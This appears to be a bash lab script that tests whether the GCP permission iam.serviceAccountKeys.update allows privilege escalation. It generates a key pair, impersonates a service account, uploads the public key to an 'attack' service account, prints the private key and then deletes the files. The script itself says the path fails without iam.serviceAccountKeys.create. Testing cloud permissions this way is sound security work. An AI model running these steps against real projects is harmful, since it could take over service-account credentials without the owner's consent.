#!/bin/bash

source lib/lib.sh


echo "This won't work as the permission iam.serviceAccountKeys.create is also needed"

echo "================================================"
echo "Checking iam.serviceAccountKeys.update"


modify_role "iam.serviceAccountKeys.update"

openssl req -x509 -nodes -newkey rsa:2048 -days 365 \
    -keyout /tmp/private_key.pem \
    -out /tmp/public_key.pem \
    -subj "/CN=unused"

gcloud --impersonate-service-account="${SERVICE_ACCOUNT_ID}@${PROJECT_ID}.iam.gserviceaccount.com" \
  iam service-accounts keys upload /tmp/public_key.pem --iam-account="${ATTACK_SA}@${PROJECT_ID}.iam.gserviceaccount.com"

cat /tmp/private_key.pem

# Cleaning
read -p "Press any key to delete scenario... " -n1 -s
echo ""

rm /tmp/private_key.pem /tmp/public_key.pem

echo "================================================"
